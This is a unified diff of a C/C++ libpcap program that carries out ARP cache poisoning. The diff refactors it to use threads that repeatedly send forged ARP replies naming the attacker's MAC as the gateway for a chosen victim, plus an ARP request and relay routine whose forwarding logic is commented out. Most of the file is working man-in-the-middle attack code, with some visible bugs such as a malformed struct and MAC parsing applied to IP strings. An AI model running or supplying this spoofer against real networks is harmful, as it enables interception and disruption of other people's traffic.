@@ -10,6 +10,7 @@
 #include <netinet/in.h>
 #include <netinet/ether.h>
 #include <arpa/inet.h>
+#include <pthread.h>
 
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -42,14 +43,13 @@ using namespace std;
 
     };
 
-
     struct ether_arp_hdr *eth_arp_hdr;
     struct ifreq ifr;
 
 
  char change_mac(char mac[], unsigned char *packet) {
 
-     sscanf(mac, "%x:%x:%x:%x:%x:%x", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
+     sscanf(mac, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
  }
 
  int get_my_mac(char *dev, unsigned char *packet) {
@@ -91,71 +91,123 @@ using namespace std;
 
  }
 
- int arp_infection_packet(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd) {
+ int arp_infection_packet(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {
 
-     change_mac(argd, eth_arp_hdr->h_dest); // Ethernet Destination
-     for(int i=0; i<6; i++) { // Ethernet Source
-         eth_arp_hdr->h_source[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
-     }
+     change_mac(victim_mac, eth_arp_hdr->h_dest);
+     get_my_mac(dev, eth_arp_hdr->h_source);
 
-     // ARP
+     // ARP reply
      arp_packet(0x0002);
 
-     put_ip(argb, eth_arp_hdr->__ar_sip); // Sender ip
-     get_my_mac(arga, eth_arp_hdr->__ar_sha); // Sender mac
-     change_mac(argd, eth_arp_hdr->__ar_tha); // Target mac
-     put_ip(argc, eth_arp_hdr->__ar_tip); // Target ip
+     get_my_mac(dev, eth_arp_hdr->__ar_sha);
+     put_ip(gateway_ip, eth_arp_hdr->__ar_sip);
+     change_mac(dev, eth_arp_hdr->__ar_tha);
+     put_ip(victim_ip, eth_arp_hdr->__ar_tip);
 
      if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
-              cout << "Send infaction packet" << endl;
+              cout << "Error send infaction packet" << endl;
               return -1;
      }
-     else cout << endl << endl << "Send infaction packet" << endl;
+     else cout << "Send infaction packet" << endl;
  }
 
- int arp_request(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd) {
+ int arp_request(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {
 
     // Attacker -> Target
-     memset(eth_arp_hdr->h_dest, 0xff, 6);// Request Ethernet Destination
-     get_my_mac(arga, eth_arp_hdr->h_source); // Request Ethernet Source
+     memset(eth_arp_hdr->h_dest, 0xff, 6);
+     get_my_mac(dev, eth_arp_hdr->h_source);
 
+     // Arp request
      arp_packet(0x0001);
 
-     put_ip(argc, eth_arp_hdr->__ar_sip); // Sender ip = Victim ip
-     get_my_mac(arga, eth_arp_hdr->__ar_sha); // Sender mac = My mac
-     memset(eth_arp_hdr->__ar_tha, 0xff, 6); // Target mac = broadcast
-     put_ip(argb, eth_arp_hdr->__ar_tip); // Target ip = gateway ip
+     get_my_mac(dev, eth_arp_hdr->__ar_sha);
+     put_ip(victim_ip, eth_arp_hdr->__ar_sip);
+     memset(eth_arp_hdr->__ar_tha, 0xff, 6);
+     put_ip(gateway_ip, eth_arp_hdr->__ar_tip);
 
      if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
-              cout << "Error request packet" << endl;
+              cout << "Error arp request packet" << endl;
               return -1;
      }
-     else cout << endl << endl << "Send request packet" << endl;
+     else cout << "Send arp request packet" << endl;
  }
 
+ int relay_ip_packet(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {
 
- int relay_ip_packet(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd, unsigned char *packet) {
+     struct ethhdr *ep;
+     struct pcap_pkthdr *pkthdr;
+     const u_char *packet;
+     int res;
 
-     // Attacker -> Target
-     memcpy(eth_arp_hdr->h_dest, packet, sizeof(eth_arp_hdr->h_dest)); // Destination = gateway mac address
-     change_mac(argd, eth_arp_hdr->h_source); // source = My mac address
+     while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
 
-     arp_packet(0x0001);
+         if(res == 0) continue;
+         if(res < 0) {
+             cout << "Error reading the packets" << pcap_geterr(pcd);
+             exit(1);
+         }
 
-     put_ip(argc, eth_arp_hdr->__ar_sip); // Sender ip = Victim ip
-     change_mac(argd, eth_arp_hdr->__ar_sha); // Sender mac = My mac
-
-     memcpy(eth_arp_hdr->__ar_tha, packet, sizeof(eth_arp_hdr->__ar_tha)); // Target mac = broadcast
-     put_ip(argb, eth_arp_hdr->__ar_tip); // Target ip = gateway ip
+         ep = (struct ethhdr*)packet; // Get packet
 
 
-     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
-              cout << "Error relay packet" << endl;
-              return -1;
-     }
-     else cout << endl << endl << "Send relay packet" << endl;
+
+        /* // Attacker -> Victim
+         get_my_mac(dev, eth_arp_hdr->h_source);
+         change_mac(victim_ip, eth_arp_hdr->h_dest);
+
+         // (Src)Victim -> (Dst)Attacker, Get victim packet.
+         if((memcmp(ep->h_source, eth_arp_hdr->h_source, sizeof(ep->h_source)))
+                 && memcmp(ep->h_dest, eth_arp_hdr->h_dest, sizeof(ep->h_dest))) {
+
+             // (Src)Attacker -> (Dst)Gateway, Send victim packet
+             change_mac(gateway_ip, ep->h_dest);
+             get_my_mac(dev, ep->h_source);
+
+             if(pcap_sendpacket(pcd, (const u_char*)ep, 42) != 0) {
+                      cout << "Error relay packet" << endl;
+                      return -1;
+             }
+             else cout << "Send relay packet" << endl;
+         }*/
+         break;
+    }
+
  }
 
+ typedef struct {
+
+     char *argv[];
+     pcap_t *pcd;
+
+ }thread_args;
+
+ void *infection_thread(void *thr) {
+
+     thread_args *args = (thread_args *)thr;
+     char *dev = args->argv[1];
+     char *gateway_ip = args->argv[2];
+     char *victim_ip = args->argv[3];
+     char *victim_mac = args->argv[4];
+     pcap_t *pcd = args->pcd;
+
+     arp_infection_packet(dev, gateway_ip, victim_ip, victim_mac, pcd);
+
+ }
+
+ void *relay_thread(void *thr) {
+
+     thread_args *args = (thread_args *)thr;
+     char *dev = args->argv[1];
+     char *gateway_ip = args->argv[2];
+     char *victim_ip = args->argv[3];
+     char *victim_mac = args->argv[4];
+     pcap_t *pcd = args->pcd;
+
+     arp_request(dev, gateway_ip, victim_ip, victim_mac, pcd);
+     sleep(1);
+     relay_ip_packet(dev, gateway_ip, victim_ip, victim_mac, pcd);
+
+ }
 
 int main(int argc, char *argv[])
 {
@@ -174,56 +226,29 @@ int main(int argc, char *argv[])
         return -1;
     }
 
+    eth_arp_hdr = new ether_arp_hdr;
+
+    pthread_t t1, t2;
+    thread_args thr;
+
+    thr.argv[1] = argv[1];
+    thr.argv[2] = argv[2];
+    thr.argv[3] = argv[3];
+    thr.argv[4] = argv[4];
+    thr.pcd = pcd;
+
     struct ethhdr *ep;
     struct pcap_pkthdr *pkthdr;
-    eth_arp_hdr = new ether_arp_hdr;
     const u_char *packet;
     int res;
 
+
+
     while(1) {
+        pthread_create(&t1, NULL, infection_thread, &thr);
+        pthread_create(&t2, NULL, relay_thread, &thr);
+            cout << endl << " --------------- " << endl;
+            sleep(3);
 
-        arp_infection_packet(argv[1], argv[2], argv[3], argv[4], pcd);
-        arp_request(argv[1], argv[2], argv[3], argv[4], pcd);
-
-        while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) { // ethernet packet
-
-            sleep(1);
-
-            if(res == 0) continue;
-            if(res < 0) {
-                cout << "Error reading the packets" << pcap_geterr(pcd);
-                return -1;
-            }
-
-            ep = (struct ethhdr*)packet;
-
-            if(htons(ep->h_proto) == ETHERTYPE_ARP) {
-                sleep(1);
-                relay_ip_packet(argv[1], argv[2], argv[3], argv[4], pcd, ep->h_source);
-              //  arp_infection_packet(argv[1], argv[2], argv[3], argv[4], argv[5], pcd);
-                // here, infection packet need if
-                break;
-            }
-        }
-    sleep(3);
     }
 }
-
-
-
-/*
-
-    FILE *fp;
-    char buff[1024];
-
-    fp = popen("ifconfig", "r");
-    if(fp == NULL) return -1;
-    while(fgets(buff, sizeof(buff), fp)) { printf("--%s", buff); }
-    pclose(fp);
-
-    regex rx("HWaddr ([^ ])*");
-    printf("%s", rx);
-
- */
-
-
